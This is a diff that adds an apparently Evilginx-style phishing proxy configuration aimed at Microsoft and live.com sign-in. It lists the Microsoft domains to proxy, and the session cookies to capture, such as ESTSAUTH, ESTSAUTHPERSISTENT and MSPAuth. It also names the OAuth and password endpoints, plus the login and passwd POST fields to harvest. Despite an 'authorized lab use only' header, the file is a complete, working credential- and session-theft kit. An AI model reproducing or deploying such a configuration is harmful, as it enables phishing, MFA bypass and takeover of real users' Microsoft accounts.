@@ -1,0 +1,162 @@
+# Authorized lab use only
+author: lab-operator
+min_ver: 2.3.0
+proxy_hosts:
+  - phish_sub: data
+    orig_sub: data
+    domain: microsoft.com
+    session: true
+    is_landing: true
+    auto_filter: true
+  - phish_sub: m365
+    orig_sub: m365
+    domain: cloud.microsoft
+    session: true
+    is_landing: false
+    auto_filter: true
+  - phish_sub: logincdn
+    orig_sub: logincdn
+    domain: msauth.net
+    session: false
+    is_landing: false
+    auto_filter: true
+  - phish_sub: login
+    orig_sub: login
+    domain: live.com
+    session: true
+    is_landing: false
+    auto_filter: true
+  - phish_sub: login
+    orig_sub: login
+    domain: microsoftonline.com
+    is_landing: false
+    auto_filter: true
+  - phish_sub: onecdn
+    orig_sub: onecdn
+    domain: static.microsoft
+    session: false
+    is_landing: false
+    auto_filter: true
+auth_tokens:
+  - domain: microsoft.com
+    keys:
+      - MC1
+      - MS0
+  - domain: cloud.microsoft
+    keys:
+      - buid
+      - esctx
+      - esctx-SNvVQC871RU
+      - esctx-5h5ssWlWlIM
+      - fpc
+      - x-ms-gateway-slice
+      - OhpCode
+      - CS
+  - domain: live.com
+    keys:
+      - uaid
+      - MSPRequ
+      - MSPOK
+      - OParams
+      - OParams1
+      - __Host-MSAAUTH
+      - __Host-MSAAUTHP
+      - PPLState
+      - MSPShared
+      - MSPPre
+      - MSPCID
+      - MSPAuth
+      - MSPProf
+      - NAP
+      - ANON
+      - pres
+      - LOpt
+      - WLSSC
+      - SDIDC
+      - MSPOAuthVis
+      - JSH
+      - MSPBack
+  - domain: microsoftonline.com
+    keys:
+      - esctx-5h5ssWlWlIM
+      - ESTSAUTHPERSISTENT
+      - ESTSAUTH
+      - ESTSAUTHLIGHT
+      - fpc
+      - x-ms-gateway-slice
+      - stsservicecookie
+      - esctx
+auth_urls:
+  - /common/oauth2/v2.0/authorize
+  - /oauth20_authorize.srf
+  - /GetCredentialType.srf
+  - /checkpassword.srf
+  - /9188040d-6c67-4c5b-b112-36a304b66dad/oauth2/v2.0/token
+  - /consumers/oauth2/v2.0/token
+login:
+  domain: live.com
+  path: /checkpassword.srf
+credentials:
+  username:
+    key: login
+    search: (.*)
+    type: post
+  password:
+    key: passwd
+    search: (.*)
+    type: post
+sub_filters:
+  - triggers_on: data.microsoft.com
+    orig_sub: data
+    domain: microsoft.com
+    search: https://{hostname}/
+    replace: https://{hostname}/
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+  - triggers_on: m365.cloud.microsoft
+    orig_sub: m365
+    domain: cloud.microsoft
+    search: https://{hostname}/
+    replace: https://{hostname}/
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+  - triggers_on: logincdn.msauth.net
+    orig_sub: logincdn
+    domain: msauth.net
+    search: https://{hostname}/
+    replace: https://{hostname}/
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+  - triggers_on: login.live.com
+    orig_sub: login
+    domain: live.com
+    search: https://{hostname}/
+    replace: https://{hostname}/
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+  - triggers_on: login.microsoftonline.com
+    orig_sub: login
+    domain: microsoftonline.com
+    search: https://{hostname}/
+    replace: https://{hostname}/
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+  - triggers_on: onecdn.static.microsoft
+    orig_sub: onecdn
+    domain: static.microsoft
+    search: https://{hostname}/
+    replace: https://{hostname}/
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
